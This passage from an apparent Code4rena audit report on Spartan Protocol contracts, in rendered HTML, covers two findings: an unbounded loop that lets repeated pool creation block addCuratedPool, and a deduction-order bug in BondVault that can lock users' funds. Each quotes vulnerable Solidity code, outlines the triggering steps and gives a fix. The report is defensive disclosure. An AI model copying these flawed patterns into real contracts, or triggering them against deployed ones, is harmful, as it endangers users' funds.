8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/6\">[M-11] Block usage of <code>addCuratedPool</code> </a></h2>\n<p><em>Submitted by gpersoon, also found by hickuphh3, and cmichel</em></p>\n<p>The function <code>curatedPoolCount()</code> contains a for loop over the array <code>arrayPools</code>. If <code>arrayPools</code> would be too big then the loop would run out of gas and <code>curatedPoolCount()</code> would revert. This would mean that <code>addCuratedPool()</code> cannot be executed anymore (because it calls <code>curatedPoolCount()</code> )</p>\n<p>The array <code>arrayPools</code> can be increased in size arbitrarily by repeatedly doing the following:</p>\n<ul>\n<li>create a pool with <code>createPoolADD()</code>  (which requires 10,000 SPARTA)</li>\n<li>empty the pool with <code>remove()</code> of Pool.sol, which gives back the SPARTA tokens\nThese actions will use gas to perform.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"45\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"46\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createPoolADD</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"47\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// Must be a valid token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"48\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">((</span><span class=\"mtk12\">inputToken</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">inputBase</span><span class=\"mtk1\"> &gt;= (</span><span class=\"mtk7\">10000</span><span class=\"mtk1\">*</span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span><span class=\"mtk1\">)), </span><span class=\"mtk8\">&quot;!min&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// User must add at least 10,000 SPARTA liquidity &amp; ratio must be finite</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"49\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Pool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newPool</span><span class=\"mtk1\">; </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"50\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)){</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">WBNB</span><span class=\"mtk1\">;} </span><span class=\"mtk3\">// Handle BNB -&gt; WBNB</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"51\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">18</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Token must not be SPARTA &amp; it&#39;s decimals must be 18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"52\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">newPool</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Deploy new pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"53\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newPool</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Get address of new pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"54\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mapToken_Pool</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Record the new pool address in PoolFactory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"55\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_handleTransferIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Transfer SPARTA liquidity to new pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"56\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_handleTransferIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inputToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Transfer TOKEN liquidity to new pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"57\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">arrayPools</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Add pool address to the pool array</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"58\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    ..</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"59\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"60\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">curatedPoolCount</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"61\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cPoolCount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"62\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">arrayPools</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"63\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isCuratedPool</span><span class=\"mtk1\">[</span><span class=\"mtk12\">arrayPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"64\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">cPoolCount</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"65\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"66\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"67\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cPoolCount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"68\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addCuratedPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">curatedPoolCount</span><span class=\"mtk1\">() &lt; </span><span class=\"mtk12\">curatedPoolSize</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;maxCurated&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Must be room in the Curated list</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"187\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"188\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">remove</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputToken</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"189\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeForMember</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"190\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"191\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"192\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">// Contract removes liquidity for the user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"193\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeForMember</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputToken</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"194\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_actualInputUnits</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// Get the received LP units amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"195\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">outputBase</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iUTILS</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">UTILS</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">calcLiquidityHoldings</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_actualInputUnits</span><span class=\"mtk1\">, </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// Get the SPARTA value of LP units</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"196\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">outputToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iUTILS</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">UTILS</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">calcLiquidityHoldings</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_actualInputUnits</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TOKEN</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// Get the TOKEN value of LP units</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"197\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_decrementPoolBalances</span><span class=\"mtk1\">(</span><span class=\"mtk12\">outputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputToken</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Update recorded BASE and TOKEN amounts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"198\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_actualInputUnits</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Burn the LP tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"199\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputBase</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Transfer the SPARTA to user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"200\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TOKEN</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputToken</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Transfer the TOKENs to user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"201\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemoveLiquidity</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_actualInputUnits</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"202\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">outputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"203\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Recommend creating a variable <code>curatedPoolCount</code> and increase it in <code>addCuratedPool</code> and decrease it in <code>removeCuratedPool</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/6#issuecomment-885424168\">verifyfirst (Spartan) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>We agree with the issue, this could be more efficient.</p>\n</blockquote>\n<h2 id=\"m-12-bondvaultsol-possibly-unwithdrawable-bondedlp-funds-in-claimformember--claimrate-never-zeros-after-full-withdrawals\" style=\"position:relative;\"><a href=\"#m-12-bondvaultsol-possibly-unwithdrawable-bondedlp-funds-in-claimformember--claimrate-never-zeros-after-full-withdrawals\" aria-label=\"m 12 bondvaultsol possibly unwithdrawable bondedlp funds in claimformember  claimrate never zeros after full withdrawals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/42\">[M-12] <code>BondVault.sol</code>: Possibly unwithdrawable bondedLP funds in <code>claimForMember()</code> + <code>claimRate</code> never zeros after full withdrawals</a></h2>\n<p><em>Submitted by hickuphh3, also found by 0xRajeev</em></p>\n<p>A host of problems arise from the L110-113 of the <code>claimForMember()</code> function, where <code>_claimable</code> is deducted from the bondedLP balance before the condition check, when it should be performed after (or the condition is changed to checking if the remaining bondedLP balance to zero).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"113\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"114\"></span><span class=\"grvsc-source\"><span class=\"mtk12\">mapBondAsset_memberDetails</span><span class=\"mtk1\">[</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bondedLP</span><span class=\"mtk1\">[</span><span class=\"mtk12\">member</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">_claimable</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Remove the claim amount from the user&#39;s remainder</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"115\"></span><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_claimable</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">mapBondAsset_memberDetails</span><span class=\"mtk1\">[</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bondedLP</span><span class=\"mtk1\">[</span><span class=\"mtk12\">member</span><span class=\"mtk1\">]){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"116\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">mapBondAsset_memberDetails</span><span class=\"mtk1\">[</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">claimRate</span><span class=\"mtk1\">[</span><span class=\"mtk12\">member</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// If final claim; zero-out their claimRate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"117\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong>1. Permanently Locked Funds</strong></p>\n<p>If a user claims his bonded LP asset by calling <code>dao.claimForMember()</code>, or a malicious attacker helps a user to claim by calling <code>dao.claimAllForMember()</code>, either which is done such that <code>_claimable</code> is exactly half of his remaining bondedLP funds of an asset, then the other half would be permanently locked.</p>\n<ul>\n<li>Assume <code>mapBondAsset_memberDetails[asset].bondedLP[member] = 2 * _claimable</code></li>\n<li>L110: <code>mapBondAsset_memberDetails[asset].bondedLP[member] = _claimable</code></li>\n<li>L111: The if condition is satisfied</li>\n<li>L112: User’s claimRate is erroneously set to 0 ⇒ <code>calcBondedLP()</code> will return 0, ie. funds are locked permanently</li>\n</ul>\n<p><strong>2. Claim Rate Never Zeroes For Final Claim</strong></p>\n<p>On the flip side, should a user perform a claim that enables him to perform a full withdrawal (ie. <code>_claimable</code> = <code>mapBondAsset_memberDetails[asset].bondedLP[member]</code>, we see the following effects:</p>\n<ul>\n<li>L110: <code>mapBondAsset_memberDetails[asset].bondedLP[member] = 0</code></li>\n<li>L111: The if condition is not satisfied, L112 does not execute, so the member’s claimRate for the asset remains non-zero (it is expected to have been set to zero).</li>\n</ul>\n<p>Thankfully, subsequent behavior remains as expected since <code>calcBondedLP</code> returns zero as <code>claimAmount</code> is set to the member’s bondedLP balance (which is zero after a full withdrawal).</p>\n<p>The <code>_claimable</code> deduction should occur after the condition check. Alternatively, change the condition check to <code>if (mapBondAsset_memberDetails[asset].bondedLP[member] == 0)</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/42#issuecomment-885453442\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Good find, suggested mitigation solves the potential to lock funds.</p>\n</blockquote>\n<h2 id=\"m-13-vulnerable-pool-initial-rate\" style=\"position:relative;\"><a href=\"#m-13-vulnerable-pool-initial-rate\" aria-label=\"m 13 vulnerable pool initial rate permalink\" class=\"anchor before\"><svg 